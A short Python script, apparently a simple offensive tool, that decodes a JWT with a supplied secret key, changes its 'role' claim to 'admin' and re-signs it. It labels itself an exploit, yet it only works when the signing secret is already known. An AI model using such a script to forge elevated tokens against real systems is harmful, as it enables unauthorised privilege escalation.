import jwt
import sys

# Function to analyze and exploit JWT vulnerabilities
def jwt_token_exploiter(jwt_token, secret_key):
    try:
        # Decode the JWT token
        decoded_token = jwt.decode(jwt_token, secret_key, algorithms=['HS256'])

        # Modify token claims (for educational purposes only)
        # Example: Change the user role
        decoded_token['role'] = 'admin'

        # Encode the modified claims into a new JWT token
        modified_token = jwt.encode(decoded_token, secret_key, algorithm='HS256')

        return modified_token

    except jwt.ExpiredSignatureError:
        print("Error: Token has expired.")
    except jwt.DecodeError:
        print("Error: Failed to decode the token.")
    except jwt.InvalidTokenError:
        print("Error: Invalid token.")
    except Exception as e:
        print(f"Error: An unexpected error occurred - {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python jwt_exploiter.py <JWT_TOKEN> <SECRET_KEY>")
        sys.exit(1)

    jwt_token = sys.argv[1]
    secret_key = sys.argv[2]

    try:
        modified_token = jwt_token_exploiter(jwt_token, secret_key)

        if modified_token:
            print("Modified JWT Token:", modified_token)
    except KeyboardInterrupt:
        print("\nScript terminated by user.")
